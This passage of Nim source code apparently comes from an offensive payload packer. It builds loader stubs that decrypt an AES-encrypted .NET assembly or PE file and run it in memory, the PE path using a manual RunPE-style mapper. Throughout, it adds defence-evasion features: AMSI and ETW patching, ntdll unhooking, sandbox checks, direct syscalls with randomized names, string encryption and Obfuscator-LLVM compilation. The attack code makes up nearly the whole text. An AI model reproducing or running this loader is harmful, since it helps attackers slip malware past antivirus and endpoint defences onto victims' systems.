                echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
    else:
        if llvm_obfuscator == false:
            discard os.execShellCmd(fmt"nim c -d=release --cc:gcc --opt:size --passL:-s -d=mingw --hints=on --app=gui --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
        else:
            echo "[+] Using Obfuscator-LLVM to compile"
            var result = execCmdEx("x86_64-w64-mingw32-clang -v")
            if "Obfuscator-LLVM" in result.output or "heroims" in result.output:
                let ochars = {'A'..'Z','0'..'9'}
                var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
                #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
                discard os.execShellCmd(fmt"nim c -d=release --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}' -d=mingw --hints=on --app=gui --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
            else:
                echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
    discard os.execShellCmd("rm syscalls2.nim")
    discard os.execShellCmd("rm stub.nim")
    if os.fileExists(outfile) == true:
        echo "\n" & fmt"[+] Stub compiled successfully as {outfile}"
    else:
        echo "\n" & "[!] Stub compilation failed! Check stub for errors."

elif toLowerAscii(typename) == "csharp":
    let stub = """
# Credit/References
# @byt3bl33d3r: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/execute_assembly_bin.nim
# @ShitSecure: https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/

import winim
import winim/clr except `[]`
import dynlib
import os
import nimcrypto
import base64
import strutils
import strformat
import ptr_math
import random
import times
REPLACE_ME_STRENC
include REPLACE_ME_SYSCALL_INCLUDE

REPLACE_ME_GETSYSCALLSTUB

REPLACE_ME_SANDBOX_CHECKS

REPLACE_ME_NTDLL_UNHOOK

REPLACE_ME_AMSI_ETW_PATCH

func toByteSeq*(str: string): seq[byte] {.inline.} =
  # Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

var dctx: CTR[aes256]

var enctext: seq[byte] = toByteSeq(decode("REPLACE_ME_ENCODED_BLOB"))
var key: array[aes256.sizeKey, byte]
var envkey: string = "REPLACE_ME_KEY"
var iv: array[aes256.sizeBlock, byte]
var pp: string = decode("REPLACE_ME_IV")

# Decode and save IV
copyMem(addr iv[0], addr pp[0], len(pp))

# Ecnrypt Key
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

var dectext = newSeq[byte](len(enctext))

echo "[*] Decrypting packed exe..."

# Decrypt
dctx.init(key, iv)
dctx.decrypt(enctext, dectext)
dctx.clear()

# Load Binary
var assembly = load(dectext)

# Handle args
var cmd: seq[string]
var i = 1
while i <= paramCount():
    cmd.add(paramStr(i))
    inc(i)
var arr = toCLRVariant(cmd, VT_BSTR)
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
    """

    var stubFinal: string = stub.replace("REPLACE_ME_AMSI_ETW_PATCH", amsi_etw_patch)
    if get_syscallstub == true:
        echo "[+] GetSyscallStub enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_SYSCALL_INCLUDE", "GetSyscallStub")
        stubFinal = stubFinal.replace("REPLACE_ME_GETSYSCALLSTUB", getsyscallstub_code)
    else:
        echo "[+] NimlineWhispers2 enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_SYSCALL_INCLUDE", "syscalls2")
        stubFinal = stubFinal.replace("REPLACE_ME_GETSYSCALLSTUB", "")
    if encrypt_strings == true:
        echo "[+] String encryption enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_STRENC", "import strenc")
    else:
        echo "[+] String encryption disabled"
        stubFinal = stubFinal.replace("REPLACE_ME_STRENC", "")
    if no_sandbox == false:
        echo "[+] Sandbox checks enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_SANDBOX_CHECKS", sandbox_checks)
    else:
        echo "[+] Sandbox checks disabled"
        stubFinal = stubFinal.replace("REPLACE_ME_SANDBOX_CHECKS", "")
    if unhook == true:
        echo "[+] Unhooking ntdll.dll enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_NTDLL_UNHOOK", ntdllunhook)
    else:
        echo "[+] Unhooking ntdll.dll disabled"
        stubFinal = stubFinal.replace("REPLACE_ME_NTDLL_UNHOOK", "")
    if verbose == true:
        echo "[+] Verbose messages enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_VERBOSE", "true")
    else:
        echo "[+] Verbose messages disabled"
        stubFinal = stubFinal.replace("REPLACE_ME_VERBOSE", "false")
    stubFinal = stubFinal.replace("REPLACE_ME_ENCODED_BLOB", encoded)
    stubFinal = stubFinal.replace("REPLACE_ME_KEY", envkey)
    stubFinal = stubFinal.replace("REPLACE_ME_IV", encodedIV)
    var syscalls_content: string = readFile("syscalls.nim")
    if no_randomization == false:
        echo "[+] Syscall name randomization enabled"
        let syscalls = ["NtWriteVirtualMemory", "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtOpenProcess", "NtQueueApcThread", "NtAlertResumeThread", "NtClose", "NtCreateThreadEx", "NtWaitForSingleObject"]
        for syscall in syscalls:
            randomize()
            var newsyscall = collect(newSeq, (for i in 0..<24: chars.sample)).join
            syscalls_content = syscalls_content.replace(syscall, newsyscall)
            stubFinal = stubFinal.replace(syscall, newsyscall)
    else:
        echo "[+] Syscall name randomization disabled"
    writeFile("syscalls2.nim", syscalls_content)
    writeFile("stub.nim", stubFinal)
    if os.fileExists(outfile) == true:
        discard os.execShellCmd(fmt"rm {outfile}")
    if llvm_obfuscator == false:
        discard os.execShellCmd(fmt"nim c -d=release --cc:gcc --opt:size --passL:-s -d=mingw --hints=on --app=console --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
    else:
        echo "[+] Using Obfuscator-LLVM to compile"
        var result = execCmdEx("x86_64-w64-mingw32-clang -v")
        if "Obfuscator-LLVM" in result.output or "heroims" in result.output:
            let ochars = {'A'..'Z','0'..'9'}
            var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
            #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
            discard os.execShellCmd(fmt"nim c -d=release --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}' -d=mingw --hints=on --app=console --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
        else:
            echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
    discard os.execShellCmd("rm syscalls2.nim")
    discard os.execShellCmd("rm stub.nim")
    if os.fileExists(outfile) == true:
        echo "\n" & fmt"[+] Stub compiled successfully as {outfile}"
    else:
        echo "\n" & "[!] Stub compilation failed! Check stub for errors."

elif toLowerAscii(typename) == "pe":
    let stub = """
# Credit/References
# @ShitSecure: https://github.com/S3cur3Th1sSh1t/Nim-RunPE

import winim
import ptr_math
import nimcrypto
import base64
import strformat
import dynlib
import strutils
import random
import times
import os
REPLACE_ME_STRENC
include REPLACE_ME_SYSCALL_INCLUDE

REPLACE_ME_GETSYSCALLSTUB

REPLACE_ME_SANDBOX_CHECKS

REPLACE_ME_NTDLL_UNHOOK

REPLACE_ME_AMSI_ETW_PATCH

var verbose: bool = REPLACE_ME_VERBOSE

var dctx: CTR[aes256]

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

var enctext: seq[byte] = toByteSeq(decode("REPLACE_ME_ENCODED_BLOB"))
var key: array[aes256.sizeKey, byte]
var envkey: string = "REPLACE_ME_KEY"
var iv: array[aes256.sizeBlock, byte]
var pp: string = decode("REPLACE_ME_IV")

# Decode and save IV
copyMem(addr iv[0], addr pp[0], len(pp))

# Ecnrypt Key
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

var dectext = newSeq[byte](len(enctext))

echo "[*] Decrypting packed exe..."

# Decrypt
dctx.init(key, iv)
dctx.decrypt(enctext, dectext)
dctx.clear()

var memloadBytes = dectext

var hProcess: HANDLE = GetCurrentProcess()
var hThread: HANDLE

var shellcodePtr: ptr = memloadBytes[0].addr

proc getNtHdrs*(pe_buffer: ptr BYTE): ptr BYTE =
  if pe_buffer == nil:
    return nil
  var idh: ptr IMAGE_DOS_HEADER = cast[ptr IMAGE_DOS_HEADER](pe_buffer)
  if idh.e_magic != IMAGE_DOS_SIGNATURE:
    return nil
  let kMaxOffset: LONG = 1024
  var pe_offset: LONG = idh.e_lfanew
  if pe_offset > kMaxOffset:
    return nil
  var inh: ptr IMAGE_NT_HEADERS32 = cast[ptr IMAGE_NT_HEADERS32]((
      cast[ptr BYTE](pe_buffer) + pe_offset))
  if inh.Signature != IMAGE_NT_SIGNATURE:
    return nil
  return cast[ptr BYTE](inh)

proc getPeDir*(pe_buffer: PVOID; dir_id: csize_t): ptr IMAGE_DATA_DIRECTORY =
  if dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES:
    return nil
  var nt_headers: ptr BYTE = getNtHdrs(cast[ptr BYTE](pe_buffer))
  if nt_headers == nil:
    return nil
  var peDir: ptr IMAGE_DATA_DIRECTORY = nil
  var nt_header: ptr IMAGE_NT_HEADERS = cast[ptr IMAGE_NT_HEADERS](nt_headers)
  peDir = addr((nt_header.OptionalHeader.DataDirectory[dir_id]))
  if peDir.VirtualAddress == 0:
    return nil
  return peDir

type
  BASE_RELOCATION_ENTRY* {.bycopy.} = object
    Offset* {.bitsize: 12.}: WORD
    Type* {.bitsize: 4.}: WORD


const
  RELOC_32BIT_FIELD* = 3

proc applyReloc*(newBase: ULONGLONG; oldBase: ULONGLONG; modulePtr: PVOID;
                moduleSize: SIZE_T): bool =
  if verbose == true:
    echo "    [!] Applying Reloc "
  var relocDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(modulePtr,
      IMAGE_DIRECTORY_ENTRY_BASERELOC)
  if relocDir == nil:
    return false
  var maxSize: csize_t = csize_t(relocDir.Size)
  var relocAddr: csize_t = csize_t(relocDir.VirtualAddress)
  var reloc: ptr IMAGE_BASE_RELOCATION = nil
  var parsedSize: csize_t = 0
  while parsedSize < maxSize:
    reloc = cast[ptr IMAGE_BASE_RELOCATION]((
        size_t(relocAddr) + size_t(parsedSize) + cast[size_t](modulePtr)))
    if reloc.VirtualAddress == 0 or reloc.SizeOfBlock == 0:
      break
    var entriesNum: csize_t = csize_t((reloc.SizeOfBlock - sizeof((IMAGE_BASE_RELOCATION)))) div
        csize_t(sizeof((BASE_RELOCATION_ENTRY)))
    var page: csize_t = csize_t(reloc.VirtualAddress)
    var entry: ptr BASE_RELOCATION_ENTRY = cast[ptr BASE_RELOCATION_ENTRY]((
        cast[size_t](reloc) + sizeof((IMAGE_BASE_RELOCATION))))
    var i: csize_t = 0
    while i < entriesNum:
      var offset: csize_t = entry.Offset
      var entryType: csize_t = entry.Type
      var reloc_field: csize_t = page + offset
      if entry == nil or entryType == 0:
        break
      if entryType != RELOC_32BIT_FIELD:
        if verbose == true:
            echo "    [!] Not supported relocations format at ", cast[cint](i), " ", cast[cint](entryType)
        return false
      if size_t(reloc_field) >= moduleSize:
        if verbose == true:
            echo "    [-] Out of Bound Field: ", reloc_field
        return false
      var relocateAddr: ptr csize_t = cast[ptr csize_t]((
          cast[size_t](modulePtr) + size_t(reloc_field)))
      if verbose == true:
        echo "    [V] Apply Reloc Field at ", repr(relocateAddr)
      (relocateAddr[]) = ((relocateAddr[]) - csize_t(oldBase) + csize_t(newBase))
      entry = cast[ptr BASE_RELOCATION_ENTRY]((
          cast[size_t](entry) + sizeof((BASE_RELOCATION_ENTRY))))
      inc(i)
    inc(parsedSize, reloc.SizeOfBlock)
  return parsedSize != 0

proc OriginalFirstThunk*(self: ptr IMAGE_IMPORT_DESCRIPTOR): DWORD {.inline.} = self.union1.OriginalFirstThunk

proc fixIAT*(modulePtr: PVOID): bool =
  if verbose == true:
    echo "[+] Fix Import Address Table\n"
  var importsDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(modulePtr,
      IMAGE_DIRECTORY_ENTRY_IMPORT)
  if importsDir == nil:
    return false
  var maxSize: csize_t = cast[csize_t](importsDir.Size)
  var impAddr: csize_t = cast[csize_t](importsDir.VirtualAddress)
  var lib_desc: ptr IMAGE_IMPORT_DESCRIPTOR
  var parsedSize: csize_t = 0
  while parsedSize < maxSize:
    lib_desc = cast[ptr IMAGE_IMPORT_DESCRIPTOR]((
        impAddr + parsedSize + cast[uint64](modulePtr)))
    
    if (lib_desc.OriginalFirstThunk == 0) and (lib_desc.FirstThunk == 0):
      break
    var libname: LPSTR = cast[LPSTR](cast[ULONGLONG](modulePtr) + lib_desc.Name)
    if verbose == true:
        echo "    [+] Import DLL: ", $libname
    var call_via: csize_t = cast[csize_t](lib_desc.FirstThunk)
    var thunk_addr: csize_t = cast[csize_t](lib_desc.OriginalFirstThunk)
    if thunk_addr == 0:
      thunk_addr = csize_t(lib_desc.FirstThunk)
    var offsetField: csize_t = 0
    var offsetThunk: csize_t = 0
    while true:
      var fieldThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
          cast[csize_t](modulePtr) + offsetField + call_via))
      var orginThunk: PIMAGE_THUNK_DATA = cast[PIMAGE_THUNK_DATA]((
          cast[csize_t](modulePtr) + offsetThunk + thunk_addr))
      var boolvar: bool
      if ((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG32) != 0):
        boolvar = true
      elif((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG64) != 0):
        boolvar = true
      if (boolvar):
        var libaddr: size_t = cast[size_t](GetProcAddress(LoadLibraryA(libname),cast[LPSTR]((orginThunk.u1.Ordinal and 0xFFFF))))
        fieldThunk.u1.Function = ULONGLONG(libaddr)
        if verbose == true:
            echo "        [V] API ord: ", (orginThunk.u1.Ordinal and 0xFFFF)
      if fieldThunk.u1.Function == 0:
        break
      if fieldThunk.u1.Function == orginThunk.u1.Function:
        var nameData: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](orginThunk.u1.AddressOfData)
        var byname: PIMAGE_IMPORT_BY_NAME = cast[PIMAGE_IMPORT_BY_NAME](cast[ULONGLONG](modulePtr) + cast[DWORD](nameData))
        

        var func_name: LPCSTR = cast[LPCSTR](addr byname.Name)
        
        var hmodule: HMODULE = LoadLibraryA(libname)
        var libaddr: csize_t = cast[csize_t](GetProcAddress(hmodule,func_name))
        if verbose == true:
            echo "        [V] API: ", func_name
 
        fieldThunk.u1.Function = ULONGLONG(libaddr)

      inc(offsetField, sizeof((IMAGE_THUNK_DATA)))
      inc(offsetThunk, sizeof((IMAGE_THUNK_DATA)))
    inc(parsedSize, sizeof((IMAGE_IMPORT_DESCRIPTOR)))
  return true

var pImageBase_addr: PVOID = nil
var pImageBase: ptr BYTE = nil
var preferAddr: LPVOID = nil
var ntHeader: ptr IMAGE_NT_HEADERS = cast[ptr IMAGE_NT_HEADERS](getNtHdrs(shellcodePtr))
if (ntHeader == nil):
  if verbose == true:
    echo "[+] File isn\'t a PE file."
  quit()

var relocDir: ptr IMAGE_DATA_DIRECTORY = getPeDir(shellcodePtr,IMAGE_DIRECTORY_ENTRY_BASERELOC)
preferAddr = cast[LPVOID](ntHeader.OptionalHeader.ImageBase)
if verbose == true:
    echo "[+] Exe File Prefer Image Base at \n"

    echo "Size:"
    echo $ntHeader.OptionalHeader.SizeOfImage

var alloc_size: SIZE_T = cast[SIZE_T](ntHeader.OptionalHeader.SizeOfImage)
var status = NtAllocateVirtualMemory(hProcess, &preferAddr, 0, &alloc_size, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
pImageBase = cast[ptr BYTE](preferAddr)

if (pImageBase == nil and relocDir == nil):
  if verbose == true:
    echo "[-] Allocate Image Base At Failure.\n"
  quit()
if (pImageBase == nil and relocDir != nil):
  if verbose == true:
    echo"[+] Try to Allocate Memory for New Image Base\n"
  status = NtAllocateVirtualMemory(hProcess, &pImageBase_addr, 0, &alloc_size, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
  pImageBase = cast[ptr BYTE](pImageBase_addr)
  if (pImageBase == nil):
    if verbose == true:
        echo"[-] Allocate Memory For Image Base Failure.\n"
    quit()
if verbose == true:
    echo"[+] Mapping Section ..."
ntHeader.OptionalHeader.ImageBase = cast[ULONGLONG](pImageBase)
copymem(pImageBase, shellcodePtr, ntHeader.OptionalHeader.SizeOfHeaders)
var SectionHeaderArr: ptr IMAGE_SECTION_HEADER = cast[ptr IMAGE_SECTION_HEADER]((cast[size_t](ntHeader) + sizeof((IMAGE_NT_HEADERS))))
var i: int = 0
while i < cast[int](ntHeader.FileHeader.NumberOfSections):
  if verbose == true:
    echo "    [+] Mapping Section :", $(addr SectionHeaderArr[i].addr.Name)
  var dest: LPVOID = (pImageBase + SectionHeaderArr[i].VirtualAddress)
  var source: LPVOID = (shellcodePtr + SectionHeaderArr[i].PointerToRawData)
  copymem(dest,source,cast[DWORD](SectionHeaderArr[i].SizeOfRawData))
  inc(i)

var goodrun = fixIAT(pImageBase)
if goodrun == false:
  if verbose == true:
    echo "fixIAT() failed"

if pImageBase != preferAddr:
  if applyReloc(cast[ULONGLONG](pImageBase), cast[ULONGLONG](preferAddr), pImageBase,
               ntHeader.OptionalHeader.SizeOfImage):
    if verbose == true:
        echo "[+] Relocation Fixed."
var retAddr: HANDLE = cast[HANDLE](pImageBase) + cast[HANDLE](ntHeader.OptionalHeader.AddressOfEntryPoint)

if verbose == true:
    echo "Run Exe Module:\n"

status = NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, cast[LPTHREAD_START_ROUTINE](retAddr), NULL, FALSE, 0, 0, 0, NULL)
status = NtWaitForSingleObject(hThread, TRUE, NULL)
"""

    var stubFinal: string = stub.replace("REPLACE_ME_AMSI_ETW_PATCH", amsi_etw_patch)
    if get_syscallstub == true:
        echo "[+] GetSyscallStub enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_SYSCALL_INCLUDE", "GetSyscallStub")
        stubFinal = stubFinal.replace("REPLACE_ME_GETSYSCALLSTUB", getsyscallstub_code)
    else:
        echo "[+] NimlineWhispers2 enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_SYSCALL_INCLUDE", "syscalls2")
        stubFinal = stubFinal.replace("REPLACE_ME_GETSYSCALLSTUB", "")
    if encrypt_strings == true:
        echo "[+] String encryption enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_STRENC", "import strenc")
    else:
        echo "[+] String encryption disabled"
        stubFinal = stubFinal.replace("REPLACE_ME_STRENC", "")
    if no_sandbox == false:
        echo "[+] Sandbox checks enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_SANDBOX_CHECKS", sandbox_checks)
    else:
        echo "[+] Sandbox checks disabled"
        stubFinal = stubFinal.replace("REPLACE_ME_SANDBOX_CHECKS", "")
    if unhook == true:
        echo "[+] Unhooking ntdll.dll enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_NTDLL_UNHOOK", ntdllunhook)
    else:
        echo "[+] Unhooking ntdll.dll disabled"
        stubFinal = stubFinal.replace("REPLACE_ME_NTDLL_UNHOOK", "")
    if verbose == true:
        echo "[+] Verbose messages enabled"
        stubFinal = stubFinal.replace("REPLACE_ME_VERBOSE", "true")
    else:
        echo "[+] Verbose messages disabled"
        stubFinal = stubFinal.replace("REPLACE_ME_VERBOSE", "false")
    stubFinal = stubFinal.replace("REPLACE_ME_ENCODED_BLOB", encoded)
    stubFinal = stubFinal.replace("REPLACE_ME_KEY", envkey)
    stubFinal = stubFinal.replace("REPLACE_ME_IV", encodedIV)
    var syscalls_content: string = readFile("syscalls.nim")
    if no_randomization == false:
        echo "[+] Syscall name randomization enabled"
        let syscalls = ["NtWriteVirtualMemory", "NtAllocateVirtualMemory", "NtProtectVirtualMemory", "NtOpenProcess", "NtQueueApcThread", "NtAlertResumeThread", "NtClose", "NtCreateThreadEx", "NtWaitForSingleObject"]
        for syscall in syscalls:
            randomize()
            var newsyscall = collect(newSeq, (for i in 0..<24: chars.sample)).join
            syscalls_content = syscalls_content.replace(syscall, newsyscall)
            stubFinal = stubFinal.replace(syscall, newsyscall)
    else:
        echo "[+] Syscall name randomization disabled"
    writeFile("syscalls2.nim", syscalls_content)
    writeFile("stub.nim", stubFinal)
    if os.fileExists(outfile) == true:
        discard os.execShellCmd(fmt"rm {outfile}")
    if llvm_obfuscator == false:
        discard os.execShellCmd(fmt"nim c -d=release --cc:gcc --opt:size --passL:-s -d=mingw --hints=on --app=console --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
    else:
        echo "[+] Using Obfuscator-LLVM to compile"
        var result = execCmdEx("x86_64-w64-mingw32-clang -v")
        if "Obfuscator-LLVM" in result.output or "heroims" in result.output:
            let ochars = {'A'..'Z','0'..'9'}
            var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
            #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
            discard os.execShellCmd(fmt"nim c -d=release --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}' -d=mingw --hints=on --app=console --cpu=amd64 --hint[Pattern]:off --out={outfile} stub.nim")
        else:
            echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
    discard os.execShellCmd("rm syscalls2.nim")
    discard os.execShellCmd("rm stub.nim")
    if os.fileExists(outfile) == true:
        echo "\n" & fmt"[+] Stub compiled successfully as {outfile}"
    else:
        echo "\n" & "[!] Stub compilation failed! Check stub for errors."

else:
    echo "[!] Invalid type: please use either csharp, raw, or pe"
